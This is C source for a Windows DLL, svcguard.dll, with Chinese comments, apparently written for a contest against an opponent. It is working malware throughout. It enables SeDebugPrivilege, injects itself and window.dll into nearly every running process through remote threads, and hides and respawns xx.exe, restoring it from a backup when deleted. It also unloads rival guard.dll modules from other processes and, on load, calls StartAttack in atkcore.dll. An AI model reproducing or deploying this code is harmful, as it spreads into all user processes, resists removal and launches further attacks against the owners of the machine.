/*
 * svcguard.dll - 守护与复活（日志格式化已修正）
 * 编译：gcc -shared -o svcguard.dll deamon.c -ladvapi32 -lpsapi -lshell32 -static -s -O2
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 共享内存常量 */
#define SHARED_MEM_NAME     L"Global\\xx_shared_mem"
#define SHARED_MEM_SIZE     4096
#define HEARTBEAT_PREFIX    L"Global\\xx_heartbeat_"
#define SUFFIX_OFFSET       0
#define SUFFIX_MAX          64
#define COUNTER_OFFSET      4064
#define HEARTBEAT_TIMEOUT   500
#define OFFSET_LOG          256
#define LOG_SIZE            3808

static HANDLE g_hSharedMem = NULL;
static PVOID  g_pSharedView = NULL;
static HANDLE g_hHeartbeatEvent = NULL;
static WCHAR  g_szXxExePath[MAX_PATH] = L"";
static WCHAR  g_szWindowDllPath[MAX_PATH] = L"";
static WCHAR  g_szDeamonDllPath[MAX_PATH] = L"";
static volatile LONG g_bExitFlag = 0;
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;

/* 注入缓存：避免每轮对所有进程反复 OpenProcess / EnumProcessModules / 远程线程。
   每 INJ_REFRESH_MS 全量重扫一次，兼顾 PID 复用与后续被卸载的情况。 */
#define INJ_CACHE_MAX   2048
#define INJ_REFRESH_MS  10000
static DWORD g_injPid[INJ_CACHE_MAX];
static int   g_injCount = 0;
static DWORD g_injLastRefresh = 0;

static BOOL InjCacheHas(DWORD pid) {
    for (int i = 0; i < g_injCount; i++)
        if (g_injPid[i] == pid) return TRUE;
    return FALSE;
}
static void InjCacheAdd(DWORD pid) {
    if (g_injCount < INJ_CACHE_MAX) g_injPid[g_injCount++] = pid;
}
static void InjCacheRefreshIfDue(void) {
    DWORD now = GetTickCount();
    if (g_injLastRefresh == 0 || now - g_injLastRefresh >= INJ_REFRESH_MS) {
        g_injCount = 0;
        g_injLastRefresh = now;
    }
}

static void EnsureLogInit(void) {
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    if (!g_pSharedView) {
        g_hSharedMem = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME);
        if (g_hSharedMem)
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    }
}

/* 日志：只写共享内存窗口，不写文件 */
static void WriteDeamonLog(const WCHAR* fmt, ...) {
    EnsureLogInit();
    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [deamon] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t len = wcslen(pLog);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t newLen = wcslen(entry);
    if (len + newLen < maxLen) {
        wcscat_s(pLog, maxLen - len, entry);
    } else {
        memmove(pLog, pLog + newLen, (maxLen - newLen) * sizeof(WCHAR));
        wcscpy_s(pLog + (maxLen - newLen), newLen, entry);
    }
    LeaveCriticalSection(&g_csLog);
}

static BOOL OpenSharedMemory(void) {
    for (int i = 0; i < 5; i++) {
        g_hSharedMem = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME);
        if (g_hSharedMem) {
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
            if (g_pSharedView) return TRUE;
            CloseHandle(g_hSharedMem);
        }
        Sleep(1000);
    }
    return FALSE;
}

static BOOL InitPaths(void) {
    WCHAR dllPath[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH))
        return FALSE;

    WCHAR* pSlash = wcsrchr(dllPath, L'\\');
    if (pSlash) {
        *(pSlash + 1) = L'\0';       /* 截断到目录 */
    } else {
        /* 没有反斜杠，可能只有驱动器号，补上反斜杠 */
        wcscat_s(dllPath, MAX_PATH, L"\\");
    }

    swprintf_s(g_szXxExePath, MAX_PATH, L"%sxx.exe", dllPath);
    swprintf_s(g_szWindowDllPath, MAX_PATH, L"%swindow.dll", dllPath);
    swprintf_s(g_szDeamonDllPath, MAX_PATH, L"%ssvcguard.dll", dllPath);

    WriteDeamonLog(L"Paths: xx=%ls, window=%ls\n", g_szXxExePath, g_szWindowDllPath);
    return TRUE;
}

/* xx.exe 被对手删除时，从同目录 xxres.bin 备份还原 */
static void EnsureXxExeExists(void) {
    if (GetFileAttributesW(g_szXxExePath) != INVALID_FILE_ATTRIBUTES) return;
    WCHAR dir[MAX_PATH], bak[MAX_PATH];
    wcscpy_s(dir, MAX_PATH, g_szXxExePath);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) *(p + 1) = L'\0';
    swprintf_s(bak, MAX_PATH, L"%sxxres.bin", dir);
    if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
        if (CopyFileW(bak, g_szXxExePath, FALSE))
            WriteDeamonLog(L"已从备份还原 xx.exe: %ls\n", g_szXxExePath);
    }
}

static BOOL InitHeartbeatEvent(void) {
    WCHAR* pSuffix = (WCHAR*)((BYTE*)g_pSharedView + SUFFIX_OFFSET);
    if (pSuffix[0] == L'\0') return FALSE;
    WCHAR name[128];
    swprintf_s(name, 128, L"%s%s", HEARTBEAT_PREFIX, pSuffix);
    g_hHeartbeatEvent = OpenEventW(SYNCHRONIZE, FALSE, name);
    WriteDeamonLog(L"Heartbeat event open: %ls\n", g_hHeartbeatEvent ? L"OK" : L"FAILED");
    return (g_hHeartbeatEvent != NULL);
}

static BOOL IsXxProcessRunning(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;
    if (Process32FirstW(h, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { found = TRUE; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return found;
}

static void RespawnXX(void) {
    WriteDeamonLog(L"检测到 xx 心跳丢失，准备复活 xx.exe: %ls\n", g_szXxExePath);
    EnsureXxExeExists();
    if (GetFileAttributesW(g_szXxExePath) == INVALID_FILE_ATTRIBUTES) {
        WriteDeamonLog(L"xx.exe 文件不存在，无法复活: %ls\n", g_szXxExePath);
        return;
    }
    /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
    if (IsXxProcessRunning()) {
        WriteDeamonLog(L"xx.exe 已在运行，跳过复活\n");
        return;
    }
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (!CreateProcessW(g_szXxExePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ShellExecuteW(NULL, L"open", g_szXxExePath, NULL, NULL, SW_HIDE);
        WriteDeamonLog(L"复活方式=ShellExecute\n");
    } else {
        WriteDeamonLog(L"复活方式=CreateProcess 成功 新PID=%lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
    WriteDeamonLog(L"HeartbeatMonitor started\n");
    if (!OpenSharedMemory() || !InitPaths() || !InitHeartbeatEvent()) {
        WriteDeamonLog(L"Initialization failed, immediate respawn\n");
        RespawnXX();
        FreeLibraryAndExitThread(GetModuleHandleW(L"svcguard.dll"), 0);
        return 0;
    }
    LONG* pCounter = (LONG*)((BYTE*)g_pSharedView + COUNTER_OFFSET);
    InterlockedIncrement(pCounter);

    while (!g_bExitFlag) {
        if (WaitForSingleObject(g_hHeartbeatEvent, HEARTBEAT_TIMEOUT) == WAIT_TIMEOUT) {
            WriteDeamonLog(L"Heartbeat timeout, respawning...\n");
            RespawnXX();
            InterlockedDecrement(pCounter);
            FreeLibraryAndExitThread(GetModuleHandleW(L"svcguard.dll"), 0);
            return 0;
        }
    }
    InterlockedDecrement(pCounter);
    return 0;
}

static BOOL IsProtected(LPCWSTR name) {
    static LPCWSTR list[] = {
        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
        L"services.exe", L"lsass.exe", L"winlogon.exe",
        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe", NULL
    };
    for (int i = 0; list[i]; i++)
        if (_wcsicmp(name, list[i]) == 0) return TRUE;
    return FALSE;
}

static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
    SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!pMem) {
        WriteDeamonLog(L"注入失败 VirtualAllocEx PID=%lu dll=%ls\n", pid, dllPath);
        return FALSE;
    }
    WriteProcessMemory(hProc, pMem, dllPath, size, NULL);
    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pMem, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 2000);
        CloseHandle(hThread);
    } else {
        WriteDeamonLog(L"注入 DLL 失败 PID=%lu dll=%ls err=%lu\n", pid, dllPath, GetLastError());
    }
    VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
    return (hThread != NULL);
}

static DWORD WINAPI SpreaderThread(LPVOID lp) {
    Sleep(5000);
    if (!g_pSharedView) OpenSharedMemory();
    InitPaths();
    while (!g_bExitFlag) {
        InjCacheRefreshIfDue();
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (IsProtected(pe.szExeFile)) continue;
                    if (InjCacheHas(pe.th32ProcessID)) continue;
                    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                               FALSE, pe.th32ProcessID);
                    if (!hProc) { InjCacheAdd(pe.th32ProcessID); continue; }

                    BOOL hasDeamon = FALSE, hasWindow = FALSE;
                    HMODULE mods[1024];
                    DWORD needed;
                    if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                        DWORD count = needed / sizeof(HMODULE);
                        for (DWORD i = 0; i < count; i++) {
                            WCHAR name[MAX_PATH];
                            if (GetModuleFileNameExW(hProc, mods[i], name, MAX_PATH)) {
                                if (!hasDeamon && wcsstr(name, L"svcguard.dll")) hasDeamon = TRUE;
                                else if (!hasWindow && wcsstr(name, L"window.dll")) hasWindow = TRUE;
                            }
                        }
                    }
                    if (!hasDeamon) InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID);
                    if (!hasWindow) InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID);
                    InjCacheAdd(pe.th32ProcessID);
                    CloseHandle(hProc);
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(500);
    }
    return 0;
}

/* 卸载对手注入的 guard.dll：只保留与我方同目录的那一份 */
static void UnloadForeignGuardPass(void)
{
    WCHAR ourGuard[MAX_PATH] = L"";
    WCHAR dllPath[MAX_PATH];
    if (GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
        WCHAR *ps = wcsrchr(dllPath, L'\\');
        if (ps) ps[1] = L'\0';
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
    }

    FARPROC pFreeLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) return;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (IsProtected(pe.szExeFile)) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                       PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HMODULE mods[1024];
            DWORD needed = 0;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    WCHAR modPath[MAX_PATH];
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const WCHAR *base = wcsrchr(modPath, L'\\');
                    base = base ? base + 1 : modPath;
                    if (_wcsicmp(base, L"guard.dll") != 0) continue;
                    if (ourGuard[0] && _wcsicmp(modPath, ourGuard) == 0) continue;
                    HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pFreeLib, mods[i], 0, NULL);
                    if (h) {
                        WaitForSingleObject(h, 1000);
                        CloseHandle(h);
                        WriteDeamonLog(L"卸载外来 guard.dll: PID=%lu %ls\n", pe.th32ProcessID, modPath);
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    Sleep(3000);
    while (!g_bExitFlag) {
        UnloadForeignGuardPass();
        Sleep(2000);
    }
    return 0;
}

static void StartRemoteAttack(void)
{
    WCHAR dir[MAX_PATH], path[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dir, MAX_PATH))
        return;
    WCHAR *pSlash = wcsrchr(dir, L'\\');
    if (pSlash) *(pSlash + 1) = L'\0';
    else return;
    swprintf_s(path, MAX_PATH, L"%satkcore.dll", dir);
    HMODULE hKill = LoadLibraryW(path);
    if (!hKill) {
        WriteDeamonLog(L"加载 atkcore.dll 失败: %ls err=%lu\n", path, GetLastError());
        return;
    }
    WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
    typedef void (WINAPI *StartAttack_t)(void);
    StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
    if (pStart) {
        pStart();
        WriteDeamonLog(L"StartAttack 已调用\n");
    } else {
        WriteDeamonLog(L"StartAttack 导出未找到\n");
    }
}

static DWORD WINAPI BootThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    StartRemoteAttack();
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

__declspec(dllexport) void WINAPI DeamonInit(void)
{
    BOOL bPriv = EnableDebugPrivilege();
    WriteDeamonLog(L"DeamonInit called, SeDebugPrivilege=%ls\n", bPriv ? L"ON" : L"OFF");
    CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);
    CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
        CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
    }
    return TRUE;
}
